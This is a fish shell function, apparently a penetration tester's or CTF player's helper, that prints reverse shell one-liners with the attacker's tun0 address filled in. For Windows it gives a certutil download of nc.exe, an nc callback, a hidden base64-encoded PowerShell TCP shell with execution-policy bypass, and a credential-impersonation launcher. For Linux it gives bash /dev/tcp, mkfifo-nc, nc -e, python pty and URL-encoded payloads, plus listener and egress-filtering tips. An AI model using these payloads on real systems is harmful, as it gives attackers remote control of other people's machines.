function rsh --description "reverse shell pre-flight: the payload that works, the listener that matches"
    argparse 'p/port=' -- $argv
    or return 1
    if test (count $argv) -lt 1
        echo "usage: rsh win|lin [-p PORT]"
        echo "  prints the reverse shell lines that have actually worked, in the order to try them,"
        echo "  with LHOST from tun0 and the port defaulting to 443. Then the listener line."
        echo "  ports: 443 first, then 80, then 53. Odd ports (1337, 4444, 9001) get filtered; four boxes proved it."
        return 1
    end
    set -l os $argv[1]
    set -l port 443; set -q _flag_port; and set port $_flag_port
    set -l ip (ip -4 addr show tun0 2>/dev/null | string match -r 'inet (\S+)/' )[2]
    test -z "$ip"; and set ip $LHOST
    test -z "$ip"; and set ip LHOST
    set -l C (set_color -o cyan); set -l N (set_color normal); set -l D (set_color brblack)
    set -l wt 'C:\Windows\Temp'

    switch $os
        case win w windows
            echo "$C── windows → $ip:$port ─────────────────────────────$N"
            echo "  $D 1. get nc there (winpwn serves it on :7331)$N"
            echo "    certutil -urlcache -split -f http://$ip:7331/nc64.exe $wt\\nc.exe"
            echo "    $D denied in Temp? use C:\\Users\\Public or the dir you are in; re-certutil rather than move$N"
            echo "  $D 2. detach it, or the shell dies when the parent exits (webshell, xp_cmdshell, scheduled task, exploit)$N"
            echo "    cmd /c start /B $wt\\nc.exe $ip $port -e cmd.exe"
            echo "    $D -e cmd.exe, never -e sh: there is no sh on Windows$N"
            echo "  $D 3. no nc and no download: powershell, no file touches disk$N"
            set -l ps "\$c=New-Object Net.Sockets.TCPClient('$ip',$port);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$r2=\$r+'PS '+(pwd).Path+'> ';\$sb=([text.encoding]::ASCII).GetBytes(\$r2);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()};\$c.Close()"
            set -l b64 (printf '%s' "$ps" | iconv -t utf-16le | base64 -w0)
            echo "    powershell -nop -w hidden -ep bypass -e $b64"
            echo "  $D 4. from a cracked credential on a box you already own (not admin, no winrm):$N"
            echo "    rcs.exe USER PASS \"$wt\\nc.exe $ip $port -e cmd.exe\" --remote-impersonation --logon-type 8"
        case lin l linux
            echo "$C── linux → $ip:$port ───────────────────────────────$N"
            echo "  $D 1. bash, works almost everywhere$N"
            echo "    bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
            echo "  $D 2. nc without -e (Debian/Ubuntu ship nc.openbsd, -e does not exist there)$N"
            echo "    rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
            echo "  $D 3. nc with -e (Alpine, busybox, nc.traditional)$N"
            echo "    nc -e /bin/sh $ip $port"
            echo "  $D 4. python, when bash is restricted$N"
            echo "    python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'"
            echo "  $D 5. inside a URL or a form: url-encode it$N"
            echo "    "(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(\"bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'\"))")
            echo "  $D upgrade:  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  then ctrl-z, stty raw -echo; fg, export TERM=xterm$N"
        case '*'
            echo "[!] win or lin"
            return 1
    end
    echo
    echo "  $D listener, start it first:$N  rketch $port"
    echo "  $D nothing comes back? the port, before the payload: try 80 then 53 (rsh $os -p 80).$N"
    echo "  $D execution confirmed but silent (ping to kali shows in tcpdump -i tun0 icmp)? it is egress filtering, not you.$N"
end
